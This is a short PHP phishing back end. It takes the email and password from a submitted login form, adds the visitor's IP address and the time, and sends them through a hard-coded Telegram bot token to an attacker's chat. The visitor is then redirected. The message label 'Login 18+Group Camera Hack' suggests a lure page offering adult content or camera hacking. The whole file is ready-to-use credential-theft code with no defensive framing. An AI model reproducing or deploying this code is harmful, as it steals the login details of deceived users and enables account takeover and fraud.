<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $botToken = "8146666203:AAGy40dz0ZmhXhYIiuov97eutv_eXazBLiA"; // Replace with your bot token
    $chatId = "6251271940"; // Replace with your chat ID
    $email = htmlspecialchars($_POST["email"]); // Email input
    $password = htmlspecialchars($_POST["password"]); // Password input
    
    // Get User IP Address
    $userIP = $_SERVER['REMOTE_ADDR'];

    // Get Current Date & Time
    date_default_timezone_set("Asia/Kolkata"); // Change timezone as needed
    $currentTime = date("Y-m-d H:i:s");

    // Telegram API URL
    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    // Message format
    $message = "🔐 *Login 18+Group Camera Hack*\n\n"
             . "📧 Email: $email\n"
             . "🔑 Password: $password\n"
             . "📅 Time: $currentTime\n"
             . "🌍 IP Address: $userIP";

    // Send request to Telegram API
    $postData = [
        "chat_id" => $chatId,
        "text" => $message,
        "parse_mode" => "Markdown"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to Google after form submission
    header("Location: index.html");
    exit();
}
?>